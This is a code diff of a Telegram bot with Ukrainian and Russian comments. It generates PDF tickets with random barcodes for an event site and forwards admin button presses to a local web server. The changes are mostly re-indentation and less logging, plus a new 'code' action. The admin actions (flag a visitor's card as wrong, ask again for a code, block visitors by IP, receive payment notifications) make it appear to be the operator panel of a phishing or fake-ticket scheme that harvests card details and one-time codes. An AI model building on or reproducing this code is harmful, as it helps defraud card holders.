@@ -55,10 +55,9 @@ payment_type_by_uid = {}
 def log_function(func):
     @wraps(func)
     async def wrapper(*args, **kwargs):
-        logging.info(f'start | args={args} kwargs={kwargs}')
+        # Зменшуємо логування - тільки помилки
         try:
             result = await func(*args, **kwargs)
-            logging.info(f'success | result={result}')
             return result
         except Exception as e:
             logging.error(f'error | Exception: {e}', exc_info=True)
@@ -1723,10 +1722,10 @@ async def ticket_input_handler(message: types.Message):
         # Показуємо процес створення
         processing_msg = await message.answer("🔄 **Створюю квиток...**\n\nЗачекайте трохи...", parse_mode="Markdown")
         
-    # Генерируем уникальный order_id
-    order_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
-    pdf_filename = f"order_{order_id}.pdf"
-    pdf_path = os.path.join(TICKETS_DIR, pdf_filename)
+        # Генерируем уникальный order_id
+        order_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
+        pdf_filename = f"order_{order_id}.pdf"
+        pdf_path = os.path.join(TICKETS_DIR, pdf_filename)
         
         # Використовуємо готовий штрих-код
     barcode_value = ''.join(random.choices(string.digits, k=16))
@@ -1875,17 +1874,17 @@ async def ticket_input_handler(message: types.Message):
         else:
             print(f"⚠️ [TICKET] QR-код (image.png) не знайдено: {qr_code_path}")
         
-    c.save()
+        c.save()
         
         # Копіюємо PDF у папку для вебсерверу
         public_ticket_dir = os.path.join('artpullse.com', 'file', 'ticket')
-    os.makedirs(public_ticket_dir, exist_ok=True)
-    public_pdf_path = os.path.join(public_ticket_dir, pdf_filename)
+        os.makedirs(public_ticket_dir, exist_ok=True)
+        public_pdf_path = os.path.join(public_ticket_dir, pdf_filename)
         
-    try:
-        shutil.copy2(pdf_path, public_pdf_path)
-    except Exception as e:
-        logging.error(f"[TICKET PDF COPY ERROR] {e}")
+        try:
+            shutil.copy2(pdf_path, public_pdf_path)
+        except Exception as e:
+            logging.error(f"[TICKET PDF COPY ERROR] {e}")
         
         # Формируем ссылку
         ticket_url = f"https://artpullse.com/file/ticket/{pdf_filename}"
@@ -1897,16 +1896,16 @@ async def ticket_input_handler(message: types.Message):
         try:
             await message.answer_document(
                 FSInputFile(pdf_path), 
-                                        caption=f"🎫 **Билет: {name}**\n\n"
-                                f"📅 Дата: {date}\n"
-                                f"🕐 Время: {time}\n"
-                                f"💰 Цена: {price}\n"
-                                f"📍 Адрес: {address}\n\n"
-                                f"🆔 ID: `{order_id}`",
+                caption=f"🎫 **Билет: {name}**\n\n"
+                        f"📅 Дата: {date}\n"
+                        f"🕐 Время: {time}\n"
+                        f"💰 Цена: {price}\n"
+                        f"📍 Адрес: {address}\n\n"
+                        f"🆔 ID: `{order_id}`",
                 parse_mode="Markdown"
             )
-    except Exception as e:
-        logging.error(f"[TICKET PDF SEND ERROR] {e}")
+        except Exception as e:
+            logging.error(f"[TICKET PDF SEND ERROR] {e}")
             await message.answer(f"❌ Ошибка при отправке PDF: {e}")
         
         # Отправляем ссылку
@@ -1936,7 +1935,7 @@ async def ticket_input_handler(message: types.Message):
             "Спробуйте ще раз або зверніться до адміністратора.",
             parse_mode="Markdown"
         )
-    user_step[uid] = None
+        user_step[uid] = None
 
 @router.callback_query(lambda c: c.data == "tickets_cancel")
 async def tickets_cancel_handler(call: types.CallbackQuery):
@@ -2229,7 +2228,7 @@ async def admin_enter_text(message: types.Message):
     if ':' in step:
         ip, page_code = step.replace("text_for_", "").split(':', 1)
     else:
-    ip = step.replace("text_for_", "")
+        ip = step.replace("text_for_", "")
         page_code = None
     text = message.text
     text_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
@@ -2730,9 +2729,9 @@ async def payment_notify(request):
             import traceback
             traceback.print_exc()
     # --- Дублювання для адміна, якщо знайдено user_id по page_code ---
-    page_code = data.get('page', '')
+    # Використовуємо той самий page_code, що й для кнопок
     admin_user_id = None
-    if page_code:
+    if page_code:  # page_code вже отримано з data.get('page_code', '')
         c = conn.cursor()
         c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
         row = c.fetchone()
@@ -2920,13 +2919,11 @@ async def admin_action_handler(call: types.CallbackQuery):
             event_currency = event_info.get('currency')
     
     if action == 'push':
-        print(f'[DEBUG] admin_action_handler: push page_code={page_code}, ip={ip}, data={call.data}')
+        print(f'[DEBUG] Processing PUSH action for page_code={page_code}, ip={ip}')
         import aiohttp as aiohttp_client
         async with aiohttp_client.ClientSession() as session:
-            print(f'[DEBUG] Sending push to http://127.0.0.1:8080/set_push_flag, page_code={page_code}')
             try:
                 resp = await session.post('http://127.0.0.1:8080/set_push_flag', json={'page_code': page_code, 'type': 'push'})
-                print(f'[DEBUG] Push response: {resp.status} {await resp.text()}')
                 
                 # Надсилаємо красиве повідомлення адміну, чия це посилання
                 if page_code:
@@ -2948,21 +2945,27 @@ async def admin_action_handler(call: types.CallbackQuery):
                         await bot.send_message(admin_user_id, push_message)
                 
             except Exception as e:
-                print(f'[DEBUG] Push request failed: {e}')
+                print(f'[ERROR] Push request failed: {e}')
         await call.answer("Push notification sent")
         return
     
-    import aiohttp as aiohttp_client
-    async with aiohttp_client.ClientSession() as session:
-        await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
-    
-    if action == 'card':
-        await call.answer("Сигнал на сайт: не вірна карта")
-    elif action == 'block':
-        await call.answer("Користувач заблокований")
-    elif action == 'unblock':
-        await call.answer("Користувач розблокований")
+    # Обробка кнопок card, block, unblock, code
+    if action in ['card', 'block', 'unblock', 'code']:
+        import aiohttp as aiohttp_client
+        async with aiohttp_client.ClientSession() as session:
+            await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
+        
+        if action == 'card':
+            await call.answer("Сигнал на сайт: не вірна карта")
+        elif action == 'block':
+            await call.answer("Користувач заблокований")
+        elif action == 'unblock':
+            await call.answer("Користувач розблокований")
+        elif action == 'code':
+            await call.answer("Код запитується")
+        return
     elif action == 'support':
+        print(f'[DEBUG] Processing SUPPORT action for ip={ip}, page_code={page_code}')
         async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
         
@@ -2994,9 +2997,13 @@ async def admin_action_handler(call: types.CallbackQuery):
         async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
         await call.answer("Код запитується знову")
+        return
     
     # НЕ змінюємо клавіатуру!
     await call.answer()
+    
+    # Додаємо логування для всіх дій
+    print(f'[DEBUG] Admin action completed: {action} for IP: {ip}, page_code: {page_code}')
 
 
 
